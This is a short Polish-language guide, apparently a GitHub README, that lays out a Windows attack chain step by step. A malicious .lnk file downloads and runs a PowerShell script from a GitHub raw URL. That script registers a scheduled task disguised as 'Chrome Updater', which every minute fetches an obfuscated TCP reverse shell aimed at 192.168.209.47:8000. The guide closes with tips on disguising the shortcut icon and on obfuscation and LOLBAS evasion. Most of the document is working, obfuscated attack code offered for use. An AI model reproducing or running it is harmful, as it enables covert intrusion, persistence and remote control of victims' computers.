

> Opis pokazujący na zdobycie revershella + persistance

## Krok 1 -  Initial Access

Wysyłamy plik ```.lnk```, który ściągnie skrypt ```b.ps1``` z CDN (w tym przypadku Github).
``` powershell
C:\Windows\System32\conhost.exe --headless powershell -c "$l='http'+'s://raw.githubusercontent.com/4ndrz3j/test-repo/main/b.ps1';(i''wR $l).content|i''E''x"
```
## Krok 2 - Dodanie zadania w Harmonogramie zadań

Skrypt ```b.ps1``` dodaje zadanie w harmonogramie zadań windowsa, pod nazwą ```Chrome Updater```, które odpala się co minutę. Wywoływane jest analogiczne polecenie jak w pliku ```.lnk```, z różnicą że ściągany i uruchamiany jest reverse shell z pliku ```c.ps1``

``` powershell
$Action = New-ScheduledTaskAction -Execute "C:\Windows\System32\conhost.exe" -Argument "--headless powershell -c `"`$l='http'+'s://raw.githubusercontent.com/4ndrz3j/test-repo/main/c.ps1';(i''wR `$l).content|i''E''x`""
$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)
Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "Chrome Updater"
```

## Krok 3 - Revershell

Revershell jest delikatnie zobfuskowanym TcpOnlinerem. Za każdym razem skrypt jest ściągany z zewnętrznego źródła, więc mamy możliwość jego edycji, celem zmieniania adresu/portu/działanai skryptu.

```powershell

$ip = "192.168.209.47"
$port = "8000"
 
$c= New-Obje''ct System.Net.Sockets.TCPClient($ip,$port);$s= $c.GetStream();[byte[]]$b= 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d= (N''e''w-O''b''j''e''c''t -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sendback = (iex ". { $d} 2>&1" | Out-String );$sendback2 = $sendback + 'PWND'+' ' + (p''w''d).Path + '->';$sb= ([text.encoding]::ASCII).GetBytes($sendback2);$s.Write($sb,0,$sb.Length);$stream.Flush()};$client.Close()
```

## Protips

- Warto zmienić ikonkę skrótu
- [Biblia Obfuskacji powershell](https://github.com/4ndrz3j/test-repo/new/main?filename=README.md)
- [Lolbas](https://lolbas-project.github.io/#) - można użyć innego programu niż ```conhost.exe```
